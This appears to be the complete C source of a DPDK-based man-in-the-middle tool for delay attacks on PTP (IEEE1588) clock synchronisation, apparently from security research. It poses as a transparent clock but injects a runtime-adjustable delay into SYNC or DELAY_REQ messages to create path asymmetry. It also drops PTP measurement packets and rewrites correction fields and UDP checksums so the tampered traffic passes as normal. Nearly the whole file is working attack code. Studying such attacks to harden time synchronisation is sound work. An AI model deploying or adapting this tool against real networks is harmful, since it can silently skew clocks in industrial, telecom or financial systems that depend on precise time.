/* SPDX-License-Identifier: BSD-3-Clause
 * Copyright(c) 2010-2015 Intel Corporation
 */

// Standard headers
#include <stdint.h>
#include <stdlib.h>
#include <inttypes.h>
#include <sys/queue.h>
#include <fcntl.h>
// DPDK headers
#include <rte_eal.h>
#include <rte_ethdev.h>
#include <rte_cycles.h>
#include <rte_lcore.h>
#include <rte_mbuf.h>
#include <rte_timer.h>
#include <rte_time.h>

// #include </usr/src/linux-hwe-5.15-headers-5.15.0-71/include/uapi/linux/ptp_clock.h>

// Module headers
#include "mitm.h"
#include "servo.h"
#include "clockadj.h"

// Define LIST_FOREACH_SAFE if not included in <sys/queue.h>
#ifndef LIST_FOREACH_SAFE
#define LIST_FOREACH_SAFE(var, head, field, tvar)      \
	for ((var) = LIST_FIRST(head);                     \
		 (var) && ((tvar) = LIST_NEXT(var, field), 1); \
		 (var) = (tvar))
#endif

// Define some constants
#define RX_RING_SIZE 1024
#define TX_RING_SIZE 1024

#define NUM_MBUFS 8191
#define MBUF_CACHE_SIZE 250
#define BURST_SIZE 1					/*32*/
#define MAX_TX_TMST_WAIT_MICROSECS 1000 /**< 1 milli-second */
#define MAX_RX_TMST_WAIT_MICROSECS 1000 /**< 1 milli-second */

#define PORT_0 0
#define PORT_1 1

// Helper variables to sync internal HW clocks
uint64_t prev_tsc = 0, cur_tsc, diff_tsc;
static uint64_t timer_resolution_cycles;
static struct rte_timer sync_timer;

// mbuf structure dynamic offset
static int hwts_dynfield_offset = -1;

// static int64_t correction;								// Correction factor to sync clock
static const int32_t clock_offset_correction = 27150; 	// Static offset to correct internal clock offsets [ns]
static int64_t delay_asymmetry = 0; 					// Compensate remaining clock error (as defined for TCs in IEEE1588) [ns]
static uint64_t last_pps_offset;

/* mitm.c: Basic DPDK man-in-the-middle (mitm) application for delay attacks
 * 		against PTP (IEEE1588)
 *
 * This application serves as transparent L2 mitm node that can be used for
 * delay attacks against PTP. All non-PTP packets are inspected on the fly and
 * forwarded without any further action. PTP packets on the other hand are
 * properly timestamped and the measured residence time is put into the
 * correction field (default TC behavior). Additionally, the user can set a
 * desired delay in a specified direction to render the communication channel
 * asymmetric. The introduced asymmetry will result in a delay attack which
 * affects the clock synchronization with an offset that is half the delay.
 *
 * References:
 *  - basicfwd.c (Basic DPDK skeleton forwarding example).
 *  - ieee1588fwd.c (HWTS + detection of PTPv2 messages).
 *  - ptpclient.c (HWTS)
 */

static inline rte_mbuf_timestamp_t *
hwts_field(struct rte_mbuf *mbuf)
{
	return RTE_MBUF_DYNFIELD(mbuf,
			hwts_dynfield_offset, rte_mbuf_timestamp_t *);
}

static int
port_ieee1588_fwd_begin(uint16_t port)
{
	// Enable timestamp field in mbuf structure
	rte_mbuf_dyn_rx_timestamp_register(&hwts_dynfield_offset, NULL);
	if (hwts_dynfield_offset < 0) {
		printf("ERROR: Failed to register MBUF timestamp field (dynamic)\n");
		return -rte_errno;
	}
	else
	{
		printf("MBUF timestamp field (dynamic) successfully registered.\n");
	}

	int err = rte_eth_timesync_enable(port);
	if (err < 0)
	{
		printf("Timesync enable failed: %d\n", err);
	}
	else
	{
		printf("HWTS enabled for port %u (Err: %d)\n", port, err);
	}

	return err;
}

static void
port_ieee1588_fwd_end(uint16_t port)
{
	int err = rte_eth_timesync_disable(port);
	printf("HWTS disabled for port %u (Err: %d)\n", port, err);
}

/*
 * Initializes a given port using global settings and with the RX buffers
 * coming from the mbuf_pool passed as a parameter.
 */
static inline int
port_init(uint16_t port, struct rte_mempool *mbuf_pool)
{
	struct rte_eth_conf port_conf;
	const uint16_t rx_rings = 1, tx_rings = 1;
	uint16_t nb_rxd = RX_RING_SIZE;
	uint16_t nb_txd = TX_RING_SIZE;
	int retval;
	uint16_t q;
	struct rte_eth_dev_info dev_info;
	struct rte_eth_txconf txconf;

	if (!rte_eth_dev_is_valid_port(port))
		return -1;

	memset(&port_conf, 0, sizeof(struct rte_eth_conf));

	retval = rte_eth_dev_info_get(port, &dev_info);
	if (retval != 0)
	{
		printf("Error during getting device (port %u) info: %s\n",
			   port, strerror(-retval));
		return retval;
	}

	if (dev_info.tx_offload_capa & RTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE)
		port_conf.txmode.offloads |=
			RTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE;

	/* Force full Tx path in the driver, required for IEEE1588 */
	port_conf.txmode.offloads |= RTE_ETH_TX_OFFLOAD_MULTI_SEGS;

	/* Enable IEEE1588 support (HWTS support) */
	port_conf.rxmode.offloads |= RTE_ETH_RX_OFFLOAD_TIMESTAMP;

	/* Configure the Ethernet device. */
	retval = rte_eth_dev_configure(port, rx_rings, tx_rings, &port_conf);
	if (retval != 0)
		return retval;

	retval = rte_eth_dev_adjust_nb_rx_tx_desc(port, &nb_rxd, &nb_txd);
	if (retval != 0)
		return retval;

	/* Allocate and set up 1 RX queue per Ethernet port. */
	for (q = 0; q < rx_rings; q++)
	{
		retval = rte_eth_rx_queue_setup(port, q, nb_rxd,
										rte_eth_dev_socket_id(port), NULL, mbuf_pool);
		if (retval < 0)
			return retval;
	}

	/* Allocate and set up 1 TX queue per Ethernet port. */
	for (q = 0; q < tx_rings; q++)
	{
		txconf = dev_info.default_txconf;
		txconf.offloads = port_conf.txmode.offloads;
		retval = rte_eth_tx_queue_setup(port, q, nb_txd,
										rte_eth_dev_socket_id(port), &txconf);
		if (retval < 0)
			return retval;
	}

	/* Starting Ethernet port. 8< */
	retval = rte_eth_dev_start(port);
	/* >8 End of starting of ethernet port. */
	if (retval < 0)
		return retval;

	/* Enable IEEE1588 support (HWTS support) */
	port_ieee1588_fwd_begin(port);

	/* Enable RX in promiscuous mode for the Ethernet device. */
	retval = rte_eth_promiscuous_enable(port);
	/* End of setting RX port in promiscuous mode. */
	if (retval != 0)
	{
		printf("Promiscuous mode enable failed: %s\n",
			   rte_strerror(-retval));
		return retval;
	}

	/* Display the port MAC address. */
	struct rte_ether_addr addr;
	retval = rte_eth_macaddr_get(port, &addr);
	if (retval != 0)
		return retval;

	// Debug Output
	printf("Port %u --> MAC: %02x %02x %02x %02x %02x %02x\n\n",
		   port, RTE_ETHER_ADDR_BYTES(&addr));
	printf("Port was set up successfully\n");

	return 0;
}

static int
port_ieee1588_read_tx_timestamp(uint16_t port, struct timespec *timestamp)
{
	// Read tx timestamp
	unsigned wait_us = 0;
	int err = rte_eth_timesync_read_tx_timestamp(port, timestamp);
	while ((err < 0) &&
		   (wait_us < MAX_TX_TMST_WAIT_MICROSECS))
	{
		rte_delay_us(1);
		wait_us++;
		err = rte_eth_timesync_read_tx_timestamp(port, timestamp);
	}
	// Error Output
	if (wait_us >= MAX_TX_TMST_WAIT_MICROSECS)
	{
		printf("Port %u TX timestamp registers not valid (Err: %d)\n",
			   (unsigned)port, err);
		printf("Port %u TX timestamp registers not valid after "
			   "%u micro-seconds\n",
			   (unsigned)port, (unsigned)MAX_TX_TMST_WAIT_MICROSECS);
	}
	return err;
}

static void
sync_timer_callback(__rte_unused struct rte_timer *tim,
	  __rte_unused void *arg)
{
	// Timer callback
	synchronize_clocks();

	/*
	 * According to IEEE1588, all Transparent Clocks (TCs) need to account for any
	 * errors they introduce in the delay measurements. That includes the packet's 
	 * residence time and any static delay asymmetries. With the clock synchronization
	 * control algorithm, the software minimizes the internal clock offset as much as 
	 * possible based on the algorithm used in ts2phc program. However, it seems that
	 * a minor static offset is remaining which differs after each program restart. 
	 * This offset can be measured with an oscilloscope and accounted for in the 
	 * PTP protocol with the delayAsymmetry parameter. The following section allows
	 * the user to update this value dynamically after the program has started.
	 */
	// Check for updated delay asymmetry value
	FILE *f;
	f = fopen("./delayAsymmetry.txt", "r");
	if (f)
	{
		int64_t new_delay_asymmetry;
		int err = fscanf(f, "%ld", &new_delay_asymmetry);
		if (err < -1)
		{
			printf("Error reading delayAsymmetry.txt: (Err: %d)\n", err);
		}
		fclose(f);
		if (new_delay_asymmetry != delay_asymmetry)
		{
			printf("New delayAsymmetry: %ld us (old delayAsymmetry: %ld us)\n", new_delay_asymmetry, delay_asymmetry);
			delay_asymmetry = new_delay_asymmetry;
		}
	}
	else
	{
		printf("Couldn't open delayAsymmetry.txt\n");
	}

}

static void init_clock_synchronization(void)
{
	// Init servo
	servo = servo_create(PORT_1);
	servo->servo_state = SERVO_UNLOCKED;

	// Start periodic updates
	rte_timer_subsystem_init();
	rte_timer_init(&sync_timer);
	uint64_t hz = rte_get_timer_hz();
	float timer_interval = 0.1;	// in s
	timer_resolution_cycles = (uint64_t) (hz * timer_interval);
	rte_timer_reset(&sync_timer, timer_resolution_cycles, PERIODICAL, rte_lcore_id(), sync_timer_callback, NULL);

	printf("Timer started with period %f s\n", timer_interval);
}

void synchronize_clocks(void)
{
	// Get clock offset
	int64_t offset;
	uint64_t clock_nsec;
	rte_eth_timesync_get_offset_to_pps(PORT_1, &offset, &clock_nsec);
	// Account for static clock offset
	offset -= clock_offset_correction;

	// Check if different from previous value to avoid using old value
	if (clock_nsec == last_pps_offset)
	{
		return;
	}

	// Debug Output
	printf("PPS Offset: %ld\n", offset);

	// Update saved value
	last_pps_offset = clock_nsec;

	// Update servo
	double adj = servo_sample(servo, offset, clock_nsec,
				SAMPLE_WEIGHT);

	// Update clock (PORT_1)
	switch (servo->servo_state) {
		case SERVO_UNLOCKED:
			break;
		case SERVO_JUMP:
			clockadj_set_freq(PORT_1, -adj);
			clockadj_step(PORT_1, -offset);
			break;
		case SERVO_LOCKED:
		case SERVO_LOCKED_STABLE:
			clockadj_set_freq(PORT_1, -adj);
			break;
	}
}

static int timestamp_event_message(uint16_t port, uint8_t msg_type, uint16_t seq_id, struct rte_mbuf *bufs[], int64_t delay, struct res_time_head *list_head)
{
	/*
	 * Check that the received PTP packet has been timestamped by the
	 * hardware.
	 */
	if (!(bufs[0]->ol_flags & RTE_MBUF_F_RX_IEEE1588_TMST))
	{
		printf("Port %u Received PTP packet not timestamped"
			   " by hardware (Type: %d)\n",
			   (unsigned)port, msg_type);

		rte_eth_tx_burst(port ^ 1, 0, bufs, 1);
		// return -1;
	}
	else
	{
		// Read the RX timestamp
		uint64_t rx_ts = *hwts_field(bufs[0]);

		/* Add delay before forwarding packet */
		if (delay > 0)	// if delay < 0: delay other message type
			rte_delay_us(delay);
		else
			delay = 0;

		// Set flag for TX timestamping
		bufs[0]->ol_flags |= RTE_MBUF_F_TX_IEEE1588_TMST;

		// Read value from NIC to prevent latching with old value
		struct timespec time = {0, 0};
		rte_eth_timesync_read_tx_timestamp(port ^ 1, &time);

		// Send one packet
		rte_eth_tx_burst(port ^ 1, 0, bufs, 1);

		// Read the TX timestamp
		struct timespec tx_time = {0, 0};
		port_ieee1588_read_tx_timestamp(port ^ 1, &tx_time);

		// Compute residence time
		uint64_t tx_ts = timespec64_to_ns(&tx_time);
		int64_t residence_time = tx_ts - rx_ts;

		printf("Residence Time:   %9ld (Port: %d, Type: %d, Delay: %ld, Id: %d)\n", residence_time, port, msg_type, delay, seq_id);

		// Consider current attack delay
		residence_time -= (delay * US_TO_NS);

		// Check for positive residence time (if negative, NICs are not in sync)
		if (residence_time < 0)
		{
			printf("Residence Time < 0!\n");
			residence_time = 0;
		}

		// Save residence time
		struct residence_time_entry *ts;
		ts = malloc(sizeof(*ts));
		if (!ts)
		{
			printf("failed to allocate memory for residence time\n");
		}
		else
		{
			ts->seq_id = seq_id;
			ts->residence_time = residence_time;
			LIST_INSERT_HEAD(list_head, ts, list);
		}
	}

	return 0;
}

static void update_correction_field(uint16_t port, uint16_t seq_id, struct ptpv21_msg *ptp_hdr, struct res_time_head *list_head)
{
	// Add residence time to correction field
	struct residence_time_entry *ts, *tmp;
	LIST_FOREACH_SAFE(ts, list_head, list, tmp)
	{
		if (ts->seq_id == seq_id)
		{
			// Found matching message
			/*
			 * Correction field format (from standard)
			 * The correctionField is the value of the correction measured in nanoseconds and multiplied by 2^16.
			 * For example, 2.5 ns is represented as 0000000000028000_16.
			 */
			
			// Read current value (note byte order conversion)
			int64_t correction_field = rte_be_to_cpu_64(ptp_hdr->correction_field);

			// Add residence time
			correction_field += (ts->residence_time << 16);

			// Add delay asymmetry (sign dependent on transmission direction)
			if (port % 2 == 0)
				correction_field += (delay_asymmetry << 16);
			else
				correction_field -= (delay_asymmetry << 16);

			// Store new value (note byte order conversion)
			ptp_hdr->correction_field = rte_cpu_to_be_64(correction_field);

			// Delete entry from list
			LIST_REMOVE(ts, list);

			break;
		}
		else
		{
			printf("Update Correction Field failed. No matching SeqId.\n");
		}
	}
}

/*
 * The lcore main. This is the main thread that does the work, reading from
 * an input port and writing to an output port.
 */
/* Basic mitm application lcore. 8< */
static __rte_noreturn void
lcore_main(void)
{
	uint16_t port;
	int64_t delay = 0; // us	(positive values delay D_REQ messages, negative values delay SYNC messages)

	struct rte_mbuf *bufs[BURST_SIZE];
	struct rte_ether_hdr *eth_hdr;
	struct rte_ipv4_hdr *ipv4_hdr;
	struct rte_udp_hdr *udp_hdr;
	struct ptpv21_msg *ptp_hdr;
	struct meas_hdr *meas_hdr;

	uint16_t eth_type;
	uint16_t nb_tx;

	struct list_head
	{
		struct list_head *next, *prev;
	};

	// Init lists
	LIST_INIT(&res_time_sync);
	LIST_INIT(&res_time_dreq);
	LIST_INIT(&res_time_meas);

	/*
	 * Check that the port is on the same NUMA node as the polling thread
	 * for best performance.
	 */
	RTE_ETH_FOREACH_DEV(port)
	if (rte_eth_dev_socket_id(port) >= 0 &&
		rte_eth_dev_socket_id(port) !=
			(int)rte_socket_id())
		printf("WARNING, port %u is on remote NUMA node to "
			   "polling thread.\n\tPerformance will "
			   "not be optimal.\n",
			   port);


	// Initializing clock servo for internal sync
	init_clock_synchronization();

	// Debug output
	printf("\nEntering main loop on core %u... [Ctrl+C to quit]\n\n",
		   rte_lcore_id());

	// Debug output
	printf("++++++++++++++++++++++++++++++++++++++++\n");
	printf("Starting MitM Attacker with %ld us delay...\n", delay);
	printf("++++++++++++++++++++++++++++++++++++++++\n");

	/* Main work of application loop. 8< */
	for (;;)
	{
		/*
		 * Receive packets on one port and forward them on the other
		 * port. The mapping is 0 -> 1, 1 -> 0
		 */
		RTE_ETH_FOREACH_DEV(port)
		{
			/* Get burst of RX packets, from first port of pair. */
			const uint16_t nb_rx = rte_eth_rx_burst(port, 0, bufs, BURST_SIZE);

			// Check whether we received at least one packet
			if (unlikely(nb_rx == 0))
				continue;

			// Get ETH header form packet
			eth_hdr = rte_pktmbuf_mtod(bufs[0], struct rte_ether_hdr *);
			eth_type = rte_be_to_cpu_16(eth_hdr->ether_type);

			// Check for PTP packets
			if (eth_type == RTE_ETHER_TYPE_1588)	// PTP network transport: L2
			{
				// Get PTP header
				ptp_hdr = rte_pktmbuf_mtod_offset(bufs[0], struct ptpv21_msg *, sizeof(struct rte_ether_hdr));

				ipv4_hdr = NULL;
				udp_hdr = NULL;
			}
			else if (eth_type == RTE_ETHER_TYPE_IPV4)	// PTP network transport: UDPv4
			{
				// Get IPv4 header
				ipv4_hdr = rte_pktmbuf_mtod_offset(bufs[0], struct rte_ipv4_hdr *, sizeof(struct rte_ether_hdr));

				uint8_t ihl = ipv4_hdr->ihl;
				uint8_t next_proto = ipv4_hdr->next_proto_id;

				// uint32_t src_addr = rte_be_to_cpu_32(ipv4_hdr->src_addr);
				// printf("IP Src: %08x (%u.%u.%u.%u), len: %u, proto: %u\n", src_addr, ((src_addr >> 3*8) & 0xFF), ((src_addr >> 2*8) & 0xFF), ((src_addr >> 1*8) & 0xFF), ((src_addr >> 0*8) & 0xFF), ihl, next_proto);

				if((ihl == 5) && (next_proto == IPPROTO_UDP))	// I: len = 32bit * 5(ihl) = 20 Byte; II: proto = UDP (17)
				{
					// Get UDP header
					udp_hdr = rte_pktmbuf_mtod_offset(bufs[0], struct rte_udp_hdr *, sizeof(struct rte_ether_hdr) + sizeof(struct rte_ipv4_hdr));

					uint16_t udp_src_port = rte_be_to_cpu_16(udp_hdr->src_port);
					// printf("UDP Src: %u\n", udp_src_port);

					if((udp_src_port == 319) || (udp_src_port == 320))	// PTP ports: 319, 320
					{
						// Get PTP header
						ptp_hdr = rte_pktmbuf_mtod_offset(bufs[0], struct ptpv21_msg *, sizeof(struct rte_ether_hdr) + sizeof(struct rte_ipv4_hdr) + sizeof(struct rte_udp_hdr));
					}
					else
					{
						printf("Unknown UDP src port used: %u\n", udp_src_port);
						ptp_hdr = NULL;
					}
				}
				else
				{
					printf("Unknown IP packet: Len=%u, Proto=%u\n", ihl, next_proto);
					udp_hdr = NULL;
					ptp_hdr = NULL;
				}
			}
			else
			{
				// Not a (supported) PTP packet
				ptp_hdr = NULL;
				udp_hdr = NULL;
				printf("ETH Type: 0x%04x\n", eth_type);
			}

			// Process valid PTP packets
			if (ptp_hdr != NULL)
			{
				// Get some header fields
				uint16_t seq_id = rte_be_to_cpu_16(ptp_hdr->seq_id);
				uint8_t msg_type = ptp_hdr->msg_type;

				// Timestamp only event messages (SYNC, DELAY_REQ)
				switch (msg_type)
				{
				case PTP_SYNC_MESSAGE:
					if (timestamp_event_message(port, msg_type, seq_id, bufs, -delay, &res_time_sync) < 0)
						rte_pktmbuf_free(bufs[0]);
					continue;

				case PTP_DELAY_REQ_MESSAGE:
					if (timestamp_event_message(port, msg_type, seq_id, bufs, delay, &res_time_dreq) < 0)
						rte_pktmbuf_free(bufs[0]);
					continue;

				case PTP_FOLLOWUP_MESSAGE:
					update_correction_field(port, seq_id, ptp_hdr, &res_time_sync);
					break;

				case PTP_DELAY_RESP_MESSAGE:
					update_correction_field(port, seq_id, ptp_hdr, &res_time_dreq);
					break;

				case PTP_MEAS:
					// Get PTP header
					meas_hdr = (struct meas_hdr *)(rte_pktmbuf_mtod(bufs[0], char *) +
												   sizeof(struct rte_ether_hdr) +
												   // TODO: Consider UDPv4, i.e., account for IP and UDP header lengths
												   sizeof(struct ptpv21_msg));
					uint32_t meas_type = rte_be_to_cpu_16(meas_hdr->type);

					// Check for MEAS and MEAS_FUP
					switch (meas_type)
					{
					case PTP_MEAS_MEASUREMENT:
						// Drop packet
						rte_pktmbuf_free(bufs[0]);
						continue;

					case PTP_MEAS_FOLLOW_UP:
						// Drop packet
						rte_pktmbuf_free(bufs[0]);
						continue;

					default:
						break;
					}

					break;

				case PTP_ANNOUNCE_MESSAGE:
					// PTP messages that can be ignored for the attack
					break;

				default:
					break;
				}
			}
			else
			{
				printf("Invalid PTP Packet.\n");
			}

			// Update UDP checksum (if necessary)
			if(udp_hdr != NULL)
			{
				/** Pseudo code for UDP checksum calculation 
				 * 
				 *    pseudo_header (12B) = source_ip (4B) + dest_ip (4B) + 0x00 (1B) + protocol (1B) + udp_length (2B)
				 *    udp_header (8B) = source_port (2B) + dest_port (2B) + udp_length (2B) + 0x0000 (2B)
				 *    udp_checksum (2B) = sum(pseudo_header + udp_header + udp_payload)
				 */

				// Get message lengths
				uint16_t ptp_msg_len = 0;
				if (ptp_hdr != NULL)
					ptp_msg_len = rte_be_to_cpu_16(ptp_hdr->msg_len);
				uint16_t udp_hdr_len = sizeof(struct rte_udp_hdr);
				uint16_t udp_msg_len = ptp_msg_len + udp_hdr_len;

				// Prepare pseudo header
				struct udp_pseudo_header ph;	// All fields expected in Big Endian (BE)
				ph.source_address = ipv4_hdr->src_addr;	// Already in Big Endian
				ph.dest_address = ipv4_hdr->dst_addr;	// Already in Big Endian
				ph.placeholder = 0x0;
				ph.protocol = IPPROTO_UDP;
				ph.udp_length = rte_cpu_to_be_16(udp_msg_len);

				// Prepare UDP header
				udp_hdr->dgram_cksum = 0x0;
				udp_hdr->dgram_len = rte_be_to_cpu_16(udp_msg_len);
				
				// Prepare pseudo buffer for calculation
				int psize = sizeof(struct udp_pseudo_header) + udp_msg_len;
				unsigned char *pseudogram = malloc(psize);
				memcpy(pseudogram, (unsigned char *) &ph, sizeof(struct udp_pseudo_header));
				memcpy(pseudogram + sizeof(struct udp_pseudo_header), udp_hdr, udp_msg_len);

				// Compute final checksum
				unsigned short *buf = (unsigned short *) pseudogram;
				unsigned int sum = 0;
				unsigned short result;
				int len = psize;
				
				for (sum = 0; len > 1; len -= 2)
					sum += *buf++;
				if (len == 1)
					sum += *(unsigned char *)buf;
				while (sum >> 16)
					sum = (sum & 0xFFFF) + (sum >> 16);
				result = ~sum;

				// Update checksum in UDP header
				udp_hdr->dgram_cksum = result;	// Result already in Big Endian 
			}

			/* Send burst of TX packets, to second port of pair. */
			nb_tx = rte_eth_tx_burst(port ^ 1, 0, bufs, nb_rx);

			/* Free any unsent packets. */
			if (unlikely(nb_tx < nb_rx))
			{
				uint16_t buf;
				for (buf = nb_tx; buf < nb_rx; buf++)
					rte_pktmbuf_free(bufs[buf]);
			}
		}

		// Check for delay updates
		FILE *f;
		f = fopen("./delay.txt", "r");
		if (f)
		{
			int64_t new_delay;
			int err = fscanf(f, "%ld", &new_delay);
			if (err < -1)
			{
				printf("Error reading delay.txt: (Err: %d)\n", err);
			}
			fclose(f);
			if (new_delay != delay)
			{
				printf("New delay: %ld us (old delay: %ld us)\n", new_delay, delay);
				delay = new_delay;
			}
		}
		else
		{
			printf("Couldn't open delay.txt\n");
		}

		// Update timers
        cur_tsc = rte_get_timer_cycles();
        diff_tsc = cur_tsc - prev_tsc;
        if (diff_tsc > timer_resolution_cycles) {
            rte_timer_manage();
            prev_tsc = cur_tsc;
        }
	}
	/* >8 End of loop. */

}
/* >8 End Basic forwarding application lcore. */

/*
 * The main function, which does initialization and calls the per-lcore
 * functions.
 */
int main(int argc, char *argv[])
{
	struct rte_mempool *mbuf_pool;
	unsigned nb_ports;
	uint16_t portid;

	/* Initializion the Environment Abstraction Layer (EAL). 8< */
	int ret = rte_eal_init(argc, argv);
	if (ret < 0)
		rte_exit(EXIT_FAILURE, "Error with EAL initialization\n");
	/* >8 End of initialization the Environment Abstraction Layer (EAL). */

	argc -= ret;
	argv += ret;

	/* Check that there are exactly two ports to send/receive on (mitm). */
	nb_ports = rte_eth_dev_count_avail();
	if (nb_ports != 2)
	{
		rte_exit(EXIT_FAILURE, "Error: number of ports must equal 2\n");
	}
	else
	{
		printf("%u ports detected\n", nb_ports);
	}

	/* Creates a new mempool in memory to hold the mbufs. */

	/* Allocates mempool to hold the mbufs. 8< */
	mbuf_pool = rte_pktmbuf_pool_create("MBUF_POOL", NUM_MBUFS * nb_ports,
										MBUF_CACHE_SIZE, 0, RTE_MBUF_DEFAULT_BUF_SIZE, rte_socket_id());
	/* >8 End of allocating mempool to hold mbuf. */

	if (mbuf_pool == NULL)
		rte_exit(EXIT_FAILURE, "Cannot create mbuf pool\n");

	/* Initializing all ports. 8< */
	RTE_ETH_FOREACH_DEV(portid)
	if (port_init(portid, mbuf_pool) != 0)
	{
		rte_exit(EXIT_FAILURE, "Cannot init port %" PRIu16 "\n",
				 portid);
	}
	/* >8 End of initializing all ports. */

	if (rte_lcore_count() > 1)
		printf("\nWARNING: Too many (%d) lcores enabled. Only 1 used.\n", rte_lcore_count());

	/* Call lcore_main on the main core only. Called on single lcore. 8< */
	lcore_main();
	/* >8 End of called on single lcore. */

	/* Cleanup */
	printf("\nCleanup ports\n");
	RTE_ETH_FOREACH_DEV(portid)
	port_ieee1588_fwd_end(portid);

	/* clean up the EAL */
	rte_eal_cleanup();

	return 0;
}
